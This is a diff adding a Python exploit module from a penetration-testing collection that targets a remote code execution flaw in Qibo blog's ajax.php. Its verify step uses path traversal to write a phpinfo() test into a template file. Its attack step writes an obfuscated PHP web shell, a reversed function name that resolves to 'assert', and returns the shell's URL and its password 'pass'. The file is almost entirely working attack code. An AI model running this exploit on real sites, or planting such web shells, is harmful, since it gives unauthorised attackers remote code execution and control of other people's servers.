@@ -1,0 +1,66 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class QiboblogRCE(Exploit):
+    expName = u"齐博blog 远程代码执行"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "6.x 7.x"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2015-098582']
+    description = u'''
+        利用条件：需登录（提供cookie参数）
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '_SERVER["HTTP_HOST"]'
+        payload = "<?php phpinfo();?>"
+        params = "?inc=ol_module&step=2&step=2&moduleid=../../../../hack/template/admin&action=maketpl&Apower[template_list]=1&postdb[filepath]=template/blue.htm&postdb[code]={0}".format(payload)
+
+        url = self.urlJoin("/blog/ajax.php")
+        response = self.http.get(url+params)
+
+        params2 = "?inc=edit_sort&job=../../../../template/blue"
+        response2 = self.http.get(url+params2)
+
+        if response2.status_code == 200:
+            if sig in response2.content:
+                result['fullpath'] = url
+                result['payload'] = payload
+
+        return result
+
+
+    def _attack(self):
+        result = Result(self)
+
+        sig = "strrev"
+        payload = '<?php $f=strrev($_GET["f"]);$f($_POST["pass"]);?>'
+        params = "?inc=ol_module&step=2&step=2&moduleid=../../../../hack/template/admin&action=maketpl&Apower[template_list]=1&postdb[filepath]=template/green.htm&postdb[code]={0}".format(payload)
+        
+        url = self.urlJoin("/blog/ajax.php")
+        response = self.http.get(url+params)
+
+        url2 = url.replace("/blog/ajax.php","/template/green.htm")
+        response2 = self.http.get(url2)
+
+        if response2.status_code == 200:
+            if sig in response2.content:
+                result['shellpath'] = url + "?inc=edit_sort&job=../../../../template/green&f=tressa"
+                result['vulinfo'] = "webshell password: pass"
+
+        return result
